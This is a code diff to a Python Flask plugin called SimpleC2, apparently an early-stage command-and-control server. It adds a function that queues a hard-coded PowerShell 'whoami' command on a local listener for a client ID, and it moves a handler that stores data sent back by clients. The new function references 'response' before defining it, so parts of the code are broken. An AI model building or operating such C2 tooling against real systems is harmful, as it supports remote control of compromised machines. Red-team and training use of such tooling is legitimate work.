@@ -30,6 +30,8 @@ import inspect
 #from flask import Flask, jsonify, request, send_from_directory, render_template, Response
 from flask import jsonify, send_from_directory, render_template, redirect, make_response
 from flask_login import LoginManager, login_required
+import requests
+import json
 
 ## API stuff
 from functools import wraps
@@ -230,66 +232,6 @@ class SimpleC2(BasePlugin, BaseLogging):
 
         ...
 
-
-################################################
-# API - Client Data & ops
-################################################
-
-    def simplec2_api_post_client_data(self):
-        ''' Naming is a littel confusing
-        POST
-
-        Gets POST data from nodes on client responses. 
-        Client -[data]-> Node -[data]-> Server
-
-        This function is desinged to be POSTED to. It takes the json data listed below.
-        Each POST will write said data to the respective client table in the SimpleC2Data.
-        
-        {
-            id: 
-            txid: transaction id, to track transaction?
-            timestamp:
-            data: "domain/username"
-
-        }
-        
-        Concerns:
-            Concurrency could be a big problem here, especially if the post commands 
-            are not handled correctly.
-
-            Fixes:
-                - Check if DB is locked b4 action.
-                - Batch send JSON data (i.e. send 100 json entries, loop over & enter into DB)
-                - Use a diff DB solution (not ideal)
-
-        '''
-        try:
-            ## Content length check/protection here?
-
-            ## get JSON data from post request
-            ## Note, keep an eye on the def of get_data, as large requests could slow the server.
-            raw_json_string = request.get_data(as_text=True)
-            print(raw_json_string)
-
-            db_instance = SimpleC2DbHandler()
-
-            client_name = request.json.get('id')
-            client_data = request.json.get('data')
-
-            ## call sqlite lib
-
-            db_instance.write_client_data_to_table(
-                client_name = client_name,
-                data = client_data
-            )
-
-            ## reutrn code?
-            return ""
-        
-        except Exception as e:
-            self.logger.warning(f"{self.logging_warning_symbol} Error with simplec2_api_post_client_data: {e}")
-
-
     def simplec2_api_client(self):
         '''
         for the GUI to GET client data from the server
@@ -365,10 +307,10 @@ class SimpleC2(BasePlugin, BaseLogging):
             ## turn into a func eventually
 
             # Get data from request
-            id = request.json.get('id')
+            client_id = request.json.get('id')
 
 
-            if id == "server":
+            if client_id == "server":
                 return "simplec2 console API is up"
                 #something?
                 ...
@@ -377,22 +319,130 @@ class SimpleC2(BasePlugin, BaseLogging):
                 ## Do actions, 
 
                 ## Get Client Object (dunno how, gonna take somethinking)
-                ## Queue command
-                ## Get callbacktime/info from client object
+
+                ## POST to respective Listnener, Queue command
+                    ##/synccommand on listener
+                response = self.queue_command_on_listener(
+                    listener_url="http://127.0.0.1:5001/synccommand",
+                    client_id=client_id
+                )
+                
+                ## Get callbacktime/info from request. 
 
                 ## put injson
 
                 # return json with details for console/gui
-                fake_data = {
-                    "message":"FakeDataReturn",
-                    "callback":"",
-                }
+                ## Directly returning json from node at the moment. 
+                return response
 
-                return jsonify(fake_data)
+                #return jsonify(fake_data)
+
+################################################
+# API - Client Data & ops
+################################################
+
+    def simplec2_api_post_client_data(self):
+        ''' Naming is a littel confusing
+        POST
+
+        Gets POST data from nodes on client responses. 
+        Client -[data]-> Node -[data]-> Server
+
+        This function is desinged to be POSTED to. It takes the json data listed below.
+        Each POST will write said data to the respective client table in the SimpleC2Data.
+        
+        {
+            id: 
+            txid: transaction id, to track transaction?
+            timestamp:
+            data: "domain/username"
+
+        }
+        
+        Concerns:
+            Concurrency could be a big problem here, especially if the post commands 
+            are not handled correctly.
+
+            Fixes:
+                - Check if DB is locked b4 action.
+                - Batch send JSON data (i.e. send 100 json entries, loop over & enter into DB)
+                - Use a diff DB solution (not ideal)
+
+        '''
+        try:
+            ## Content length check/protection here?
+
+            ## get JSON data from post request
+            ## Note, keep an eye on the def of get_data, as large requests could slow the server.
+            raw_json_string = request.get_data(as_text=True)
+            print(raw_json_string)
+
+            db_instance = SimpleC2DbHandler()
+
+            client_name = request.json.get('id')
+            client_data = request.json.get('data')
+
+            ## call sqlite lib
+
+            db_instance.write_client_data_to_table(
+                client_name = client_name,
+                data = client_data
+            )
+
+            ## reutrn code?
+            return ""
+        
+        except Exception as e:
+            self.logger.warning(f"{self.logging_warning_symbol} Error with simplec2_api_post_client_data: {e}")
 
 
+    def queue_command_on_listener(self, listener_url, client_id):
+        '''
+        Queues a command on the respective listener.
+        
+        '''
+        ## Return format used incase theres an error here
+        return_data = {
+            "client_id":"",
+            "message_id":"",
+            "callback_time":"",
+            "message": f"Error communicating with listenerNode: {response.status_code} : {response.text}"
+        }
 
-        ...
+        try:
+            request_data = {
+                "action": "powershell",
+                "arguments":"whoami",
+                "client_id":client_id
+            }
+
+            request_json = json.dumps(request_data)
+
+
+            headers = {"Content-Type": "application/json"}
+
+            response = requests.post(
+                url = listener_url,
+                data = request_json,
+                headers = headers
+            )
+
+            if response.status_code == 200:
+                # Assuming the server returns a JSON response
+                return response.json()
+            else:
+                # Handle errors (e.g., print or log the error)
+                print(response.text)
+                #return f"Error: {response.status_code}"
+                ## hacky get message back
+                return_data["message"] = f"Error communicating with listenerNode: {response.status_code} : {response.text}"
+                return jsonify(return_data)
+            
+        except Exception as e:
+                return_data["message"] = f"Error with server: {e}"
+                return jsonify(return_data)
+
+
 
 ################################################
 # API - Checkin Stuff
